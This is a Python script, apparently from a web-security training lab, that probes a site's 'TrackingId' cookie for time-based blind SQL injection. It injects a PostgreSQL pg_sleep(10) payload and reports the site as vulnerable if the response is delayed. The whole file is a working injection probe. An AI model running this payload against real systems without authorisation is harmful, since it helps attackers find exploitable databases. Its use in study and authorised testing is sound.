import sys
import requests
import urllib.parse

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}

def blind_sqli_check(url):
    sqli_payload = "' || (SELECT pg_sleep(10))--"
    sqli_payload_encoded = urllib.parse.quote(sqli_payload)
    cookies = {'TrackingId': 'OVmpehhTPt2iCL19' + sqli_payload_encoded, 'session': '5K6cNIGOLXlD50C4XUZjXGJhLf3HYEY1'}
    
    try:
        r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
        if r.status_code == 200 and r.elapsed.total_seconds() > 10:
            print("(+) Vulnerable to blind-based SQL injection")
        else:
            print("(-) Not vulnerable to blind-based SQL injection")
    except requests.exceptions.RequestException as e:
        print(f"(-) Error occurred: {e}")

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: python script.py <url>")
        print("(+) Example: python script.py http://www.example.com")
        sys.exit(-1)
    
    url = sys.argv[1]
    print("(+) Checking if tracking cookie is vulnerable to time-based blind SQLi....")
    blind_sqli_check(url)

if __name__ == "__main__":
    main()
